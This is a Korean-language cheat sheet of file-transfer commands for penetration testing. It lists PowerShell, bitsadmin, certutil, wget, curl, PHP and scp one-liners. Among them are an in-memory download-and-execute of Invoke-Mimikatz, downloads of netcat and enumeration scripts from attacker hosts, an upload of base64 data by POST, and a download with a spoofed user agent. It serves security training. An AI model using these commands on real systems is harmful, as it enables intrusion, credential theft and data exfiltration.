# 파일 전송

| **명령**                                                                                                             | **설명**                                 |
| ------------------------------------------------------------------------------------------------------------------ | -------------------------------------- |
|  `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                           | PowerShell을 사용하여 파일 다운로드               |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | PowerShell을 사용하여 메모리에서 파일 실행           |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | PowerShell을 사용하여 파일 업로드                |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Bitsadmin을 사용하여 파일 다운로드                |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Certutil을 사용하여 파일 다운로드                 |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Wget을 사용하여 파일 다운로드                     |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | cURL을 사용하여 파일 다운로드                     |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | PHP를 사용하여 파일 다운로드                      |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | SCP를 사용하여 파일 업로드                       |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | SCP를 사용하여 파일 다운로드                      |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Chrome 사용자 에이전트를 사용한 Invoke-WebRequest |
